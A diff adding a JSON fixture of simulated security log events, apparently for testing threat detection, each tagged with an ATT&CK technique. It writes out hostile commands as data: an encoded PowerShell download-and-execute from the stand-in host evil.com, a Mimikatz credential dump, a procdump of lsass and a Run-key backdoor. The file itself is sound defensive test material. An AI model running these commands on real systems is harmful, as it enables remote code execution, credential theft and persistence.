@@ -1,0 +1,96 @@
+[
+  {
+    "source": "windows_security",
+    "EventID": 4624,
+    "TimeCreated": "2026-09-12T00:15:00Z",
+    "Computer": "DC01.corp.internal",
+    "TargetUserName": "admin_svc",
+    "SubjectUserName": "-",
+    "LogonType": 3,
+    "WorkstationName": "WORKSTATION-99"
+  },
+  {
+    "source": "windows_security",
+    "EventID": 4625,
+    "TimeCreated": "2026-09-12T00:15:30Z",
+    "Computer": "DC01.corp.internal",
+    "TargetUserName": "Administrator",
+    "SubjectUserName": "-",
+    "LogonType": 2,
+    "WorkstationName": "UNKNOWN-PC"
+  },
+  {
+    "source": "powershell",
+    "EventID": 4104,
+    "TimeCreated": "2026-09-12T00:18:10Z",
+    "Computer": "FINANCE-PC04",
+    "UserId": "CORP\\jsmith",
+    "ScriptBlockText": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA=",
+    "attack_id": "T1059.001"
+  },
+  {
+    "source": "powershell",
+    "EventID": 4104,
+    "TimeCreated": "2026-09-12T00:19:00Z",
+    "Computer": "HR-PC02",
+    "UserId": "CORP\\mwilson",
+    "ScriptBlockText": "Invoke-Mimikatz -DumpCreds",
+    "attack_id": "T1003.001"
+  },
+  {
+    "source": "dns",
+    "TimeCreated": "2026-09-12T00:21:45Z",
+    "ClientIP": "10.0.4.15",
+    "QueryName": "a3f89b12c4d9e01f.c2-exfil-node.xyz",
+    "QueryType": "TXT",
+    "ResponseCode": "NOERROR"
+  },
+  {
+    "source": "dns",
+    "TimeCreated": "2026-09-12T00:22:10Z",
+    "ClientIP": "10.0.4.88",
+    "QueryName": "update.microsoft.com",
+    "QueryType": "A",
+    "ResponseCode": "NOERROR"
+  },
+  {
+    "source": "network",
+    "TimeCreated": "2026-09-12T00:25:00Z",
+    "SourceIp": "10.0.4.15",
+    "DestinationIp": "185.220.101.5",
+    "DestinationPort": 4444,
+    "SourcePort": 51234,
+    "action": "ALLOW",
+    "attack_id": "T1071.001"
+  },
+  {
+    "source": "network",
+    "TimeCreated": "2026-09-12T00:26:12Z",
+    "SourceIp": "10.0.4.200",
+    "DestinationIp": "198.51.100.44",
+    "DestinationPort": 80,
+    "SourcePort": 52100,
+    "action": "DENY"
+  },
+  {
+    "source": "edr",
+    "TimeCreated": "2026-09-12T00:28:30Z",
+    "ComputerName": "PROD-DB-01",
+    "AccountName": "SYSTEM",
+    "event_type": "LSASSDump",
+    "process_name": "procdump.exe",
+    "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
+    "confidence": 0.95,
+    "attack_id": "T1003.001"
+  },
+  {
+    "source": "edr",
+    "TimeCreated": "2026-09-12T00:30:00Z",
+    "ComputerName": "DEV-LAPTOP-12",
+    "AccountName": "CORP\\devuser",
+    "event_type": "RegistryModification",
+    "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BackdoorKey",
+    "confidence": 0.90,
+    "attack_id": "T1547.001"
+  }
+]
